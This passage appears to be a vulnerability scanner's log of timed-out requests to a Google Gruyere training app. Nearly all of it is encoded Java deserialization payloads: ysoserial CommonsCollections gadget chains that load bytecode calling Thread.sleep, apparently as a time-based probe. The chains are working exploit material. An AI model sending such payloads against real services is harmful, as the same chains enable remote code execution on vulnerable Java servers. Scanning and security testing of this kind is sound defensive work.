jdFRyYW5zbGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQAIPGNsaW5pdD4BABBqYXZhL2xhbmcvVGhyZWFkBwAqAQAFc2xlZXABAAQoSilWDAAsAC0KACsALgEADVN0YWNrTWFwVGFibGUBABp0ZW5hYmxlL1dBUzQ4MjA1NDgxNTEwMzIwNwEAHEx0ZW5hYmxlL1dBUzQ4MjA1NDgxNTEwMzIwNzsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAuAA4AAAAMAAEAAAAFAA8AMgAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAzAA4AAAAgAAMAAAABAA8AMgAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA3AA4AAAAqAAQAAAABAA8AMgAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAiAAMAAgAAAA2nAAMBTBELuIW4AC%2BxAAAAAQAwAAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJdXEAfgAfAAAB1Mr%2Bur4AAAAzABsKAAMAFQcAFwcAGAcAGQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQVx5mnuPG1HGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADRm9vAQAMSW5uZXJDbGFzc2VzAQAlTHlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcAGgEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgAAQABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAADsADgAAAAwAAQAAAAUADwASAAAAAgATAAAAAgAUABEAAAAKAAEAAgAWABAACXB0AANXQVNwdwEAeHVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAXZyAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlcwAAAAAAAAAAAAAAeHB3BAAAAANzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXEAfgApeA%3D%3D'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/newsnippet2?snippet=rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAuW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwdXIALltMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zNC5UcmFuc2Zvcm1lcjs5gTr7CNo/pQIAAHhwAAAAAnNyADxvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnM0LmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAP29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H+khtA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAUTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABjTK/rq+AAAAMwAzCgADACIHADEHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQAIPGNsaW5pdD4BABBqYXZhL2xhbmcvVGhyZWFkBwAqAQAFc2xlZXABAAQoSilWDAAsAC0KACsALgEADVN0YWNrTWFwVGFibGUBABp0ZW5hYmxlL1dBUzQ4MjA1NDgxNTEwMzIwNwEAHEx0ZW5hYmxlL1dBUzQ4MjA1NDgxNTEwMzIwNzsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAuAA4AAAAMAAEAAAAFAA8AMgAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAzAA4AAAAgAAMAAAABAA8AMgAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA3AA4AAAAqAAQAAAABAA8AMgAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAiAAMAAgAAAA2nAAMBTBELuIW4AC+xAAAAAQAwAAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJdXEAfgAfAAAB1Mr+ur4AAAAzABsKAAMAFQcAFwcAGAcAGQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQVx5mnuPG1HGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADRm9vAQAMSW5uZXJDbGFzc2VzAQAlTHlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcAGgEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgAAQABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAADsADgAAAAwAAQAAAAUADwASAAAAAgATAAAAAgAUABEAAAAKAAEAAgAWABAACXB0AANXQVNwdwEAeHVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAXZyAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlcwAAAAAAAAAAAAAAeHB3BAAAAANzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXEAfgApeA=='
2 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/newsnippet2?snippet=aced0005737200176a6176612e7574696c2e5072696f72697479517565756594da30b4fb3f82b103000249000473697a654c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b787000000002737200426f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e73342e636f6d70617261746f72732e5472616e73666f726d696e67436f6d70617261746f722ff984f02bb108cc0200024c00096465636f726174656471007e00014c000b7472616e73666f726d657274002d4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e73342f5472616e73666f726d65723b7870737200406f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e73342e636f6d70617261746f72732e436f6d70617261626c65436f6d70617261746f72fbf49925b86eb13702000078707372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e73342e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002e5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e73342f5472616e73666f726d65723b78707572002e5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e73342e5472616e73666f726d65723b39813afb08da3fa50200007870000000027372003c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e73342e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b787076720037636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e5472415846696c746572000000000000000000000078707372003f6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e73342e66756e63746f72732e496e7374616e74696174655472616e73666f726d6572348bf47fa486d03b0200025b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c0200007870000000017372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035b5b425b00065f636c61737371007e00144c00055f6e616d657400124c6a6176612f6c616e672f537472696e673b4c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b787000000000ffffffff757200035b5b424bfd19156767db37020000787000000002757200025b42acf317f8060854e0020000787000000634cafebabe0000003300330a0003002207003107002507002601001073657269616c56657273696f6e5549440100014a01000d436f6e7374616e7456616c756505ad2093f391ddef3e0100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c6501000474686973010013537475625472616e736c65745061796c6f616401000c496e6e6572436c61737365730100354c79736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324537475625472616e736c65745061796c6f61643b0100097472616e73666f726d010072284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b5b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b2956010008646f63756d656e7401002d4c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b01000868616e646c6572730100425b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b01000a457863657074696f6e730700270100a6284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b29560100086974657261746f720100354c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b01000768616e646c65720100414c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b01000a536f7572636546696c6501000c476164676574732e6a6176610c000a000b07002801003379736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324537475625472616e736c65745061796c6f6164010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c65740100146a6176612f696f2f53657269616c697a61626c65010039636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f5472616e736c6574457863657074696f6e01001f79736f73657269616c2f7061796c6f6164732f7574696c2f476164676574730100083c636c696e69743e0100106a6176612f6c616e672f54687265616407002a010005736c656570010004284a29560c002c002d0a002b002e01000d537461636b4d61705461626c6501001a74656e61626c652f57415334383230353438313531303332303701001c4c74656e61626c652f5741533438323035343831353130333230373b002100020003000100040001001a000500060001000700000002000800040001000a000b0001000c0000002f00010001000000052ab70001b100000002000d0000000600010000002e000e0000000c000100000005000f003200000001001300140002000c0000003f0000000300000001b100000002000d00000006000100000033000e00000020000300000001000f0032000000000001001500160001000000010017001800020019000000040001001a00010013001b0002000c000000490000000400000001b100000002000d00000006000100000037000e0000002a000400000001000f003200000000000100150016000100000001001c001d000200000001001e001f00030019000000040001001a00080029000b0001000c00000022000300020000000da70003014c110bb885b8002fb1000000010030000000030001030002002000000002002100110000000a000100020023001000097571007e001f000001d4cafebabe00000033001b0a0003001507001707001807001901001073657269616c56657273696f6e5549440100014a01000d436f6e7374616e7456616c75650571e669ee3c6d47180100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c6501000474686973010003466f6f01000c496e6e6572436c61737365730100254c79736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324466f6f3b01000a536f7572636546696c6501000c476164676574732e6a6176610c000a000b07001a01002379736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324466f6f0100106a6176612f6c616e672f4f626a6563740100146a6176612f696f2f53657269616c697a61626c6501001f79736f73657269616c2f7061796c6f6164732f7574696c2f47616467657473002100020003000100040001001a000500060001000700000002000800010001000a000b0001000c0000002f00010001000000052ab70001b100000002000d0000000600010000003b000e0000000c000100000005000f001200000002001300000002001400110000000a00010002001600100009707400035741537077010078757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000017672001d6a617661782e786d6c2e7472616e73666f726d2e54656d706c6174657300000000000000000000007870770400000003737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b02000078700000000171007e002978'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/newsnippet2?snippet=rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAuW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwdXIALltMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zNC5UcmFuc2Zvcm1lcjs5gTr7CNo/pQIAAHhwAAAAAnNyADxvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnM0LmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAP29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H+khtA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAUTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABjTK/rq+AAAAMwAzCgADACIHADEHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQAIPGNsaW5pdD4BABBqYXZhL2xhbmcvVGhyZWFkBwAqAQAFc2xlZXABAAQoSilWDAAsAC0KACsALgEADVN0YWNrTWFwVGFibGUBABp0ZW5hYmxlL1dBUzQ4MjEzMzc2MTgyMTQzOQEAHEx0ZW5hYmxlL1dBUzQ4MjEzMzc2MTgyMTQzOTsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAuAA4AAAAMAAEAAAAFAA8AMgAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAzAA4AAAAgAAMAAAABAA8AMgAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA3AA4AAAAqAAQAAAABAA8AMgAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAiAAMAAgAAAA2nAAMBTBETiIW4AC+xAAAAAQAwAAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJdXEAfgAfAAAB1Mr+ur4AAAAzABsKAAMAFQcAFwcAGAcAGQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQVx5mnuPG1HGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADRm9vAQAMSW5uZXJDbGFzc2VzAQAlTHlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcAGgEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgAAQABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAADsADgAAAAwAAQAAAAUADwASAAAAAgATAAAAAgAUABEAAAAKAAEAAgAWABAACXB0AANXQVNwdwEAeHVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAXZyAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlcwAAAAAAAAAAAAAAeHB3BAAAAANzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXEAfgApeA=='
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/newsnippet2?snippet=aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000037372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000007b74002679736f73657269616c2e7061796c6f6164732e436f6d6d6f6e73436f6c6c656374696f6e7335740018436f6d6d6f6e73436f6c6c656374696f6e73352e6a61766174000e6765744f626a656374536c6565707371007e000b0000003371007e000d71007e000e71007e000f7371007e000b0000003074001979736f73657269616c2e47656e65726174655061796c6f616474001447656e65726174655061796c6f61642e6a6176617400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00077872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e001a78737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b657971007e00014c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6